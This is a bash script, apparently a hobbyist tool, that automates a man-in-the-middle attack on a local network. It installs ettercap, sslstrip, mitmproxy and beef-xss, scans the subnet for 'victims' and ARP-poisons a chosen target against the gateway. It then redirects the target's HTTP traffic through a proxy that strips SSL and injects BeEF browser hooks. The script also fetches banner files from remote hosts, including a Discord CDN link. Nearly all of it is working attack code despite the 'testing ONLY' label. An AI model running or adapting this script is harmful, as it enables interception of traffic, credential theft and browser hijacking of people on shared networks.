#!/usr/bin/bash
# Written by Auxgrep
# This is for testing ONLY

BOLD="\033[01;01m"     
RED="\033[01;31m"      
GREEN="\033[01;32m"    
YELLOW="\033[01;33m"   
RESET="\033[00m"

banner=http://artscene.textfiles.com/vt100/moon.animation
banner2=https://cdn.discordapp.com/attachments/951235506363047976/980442284321550386/auxgrep.vt


if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    curl -s $banner|pv -q -L 9600
    echo -e $RED "Hey!! please run this as root"$RESET
    exit
fi
clear
curl -s $banner2|pv -q -L 9600 
sleep 3
clear

echo -e "1. SETUP"
curl -s "http://artscene.textfiles.com/vt100/moon.animation"|pv -q -L 9600
read -p "Enter ur network interface (wlan0,eth0 ect): " intr
echo ""

echo -e $YELLOW "CHECKING REQUIREMENTS!! [ * ]" | curl -s $banner|pv -q -L 9600
sleep 2
echo ""
if [  -e /usr/bin/ettercap ]; then
    echo -e $GREEN "[ ✔ ] ettercap ................[ found ]"
else 
	echo -e $RED "[ X ] ettercap -> not found "
	echo -e "\n [*] ${YELLOW} Installing ettercap ${RESET}\n"
	sudo apt-get install ettercap-read-only
fi
sleep 2
if [  -e /usr/bin/mitmproxy ]; then
    echo -e $GREEN "[ ✔ ] mitmproxy ................[ found ]"
else 
	echo -e $RED "[ X ] mitmproxy -> not found "
	echo -e "\n [*] ${YELLOW} Installing mitmproxy ${RESET}\n"
	sudo apt-get install mitmproxy
fi

if [  -e /usr/bin/sslstrip ]; then
    echo -e $GREEN "[ ✔ ] sslstrip ................[ found ]"
else 
	echo -e $RED "[ X ] sslstrip -> not found "
	echo -e "\n [*] ${YELLOW} Installing sslstrip ${RESET}\n"
	sudo apt-get install sslstrip	 
fi
if [  -e /usr/bin/xterm ]; then
    echo -e $GREEN "[ ✔ ] xterm ................[ found ]"
else 
	echo -e $RED "[ X ] xterm -> not found "
	echo -e "\n [*] ${YELLOW} Installing xterm ${RESET}\n"
	sudo apt-get install xterm
fi

if [  -e /usr/bin/beef-xss ]; then
    echo -e $GREEN "[ ✔ ] beef-xss ................[ found ]"
else 
	echo -e $RED "[ X ] beef-xss -> not found "
	echo -e "\n [*] ${YELLOW} Installing beef-xss ${RESET}\n"
	sudo apt-get install beef-xss
fi
if [  -e /usr/bin/pv ]; then
    echo -e $GREEN "[ ✔ ] pv ................[ found ]"
else 
	echo -e $RED "[ X ] pv -> not found "
	echo -e "\n [*] ${YELLOW} Installing pv ${RESET}\n"
	sudo apt-get install pv
fi
if [  -e /usr/sbin/netdiscover ]; then
    echo -e $GREEN "[ ✔ ] netdiscover ................[ found ]"
else 
	echo -e $RED "[ X ] netdiscover -> not found "
	echo -e "\n [*] ${YELLOW} Installing netdiscover ${RESET}\n"
	sudo apt-get install netdiscover
fi
sleep 1
clear
echo -e "2. Finding a router/Gateway ip and victim ip" | curl -s $banner|pv -q -L 9600
echo ""
route -n
echo ""
read -p "Enter a gateway IP/router IP address: " ip
clear
echo -e "Your entered $ip as your default gateway" | curl -s $banner|pv -q -L 9600
sleep 1
clear
route -n
echo ""
read -p "Lets detect victims Ip, Enter subnet IP(eg:192.168.0/24): " subnet
clear
echo -e "SCANNING STARTED" | curl -s $banner|pv -q -L 9600
echo ""
xterm -T "SCANNING TARGET NETWORK" -e "sudo netdiscover -i $intr -r $subnet" &
clear
echo -e "Enter victim ip Address if you have more than one target provide ur ip in ranges eg: 192.168.1.168-255"
echo ""
read -p "Target IP: " target
sleep 1
clear
echo -e "ATTACK STARTED!!!" | curl -s $banner|pv -q -L 9600
echo ""
sleep 2
xterm -T "ETTERCAP ATTACKING $target" -e "ettercap -Tq -M arp:remote -i $intr -S /$ip// /$target//" &
sleep 2
#xterm -T "SSL PROXIES" -e "mitmdump -s ssl.py -m transparent" &
sleep 2
xterm -T "PROXY SERVER = = ATTACKING WITH BEEF-HOOKS" -e "mitmdump -s "js.py" -s "ssl.py" -m transparent -p 8080" &
sleep 2
xterm -e "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080" &
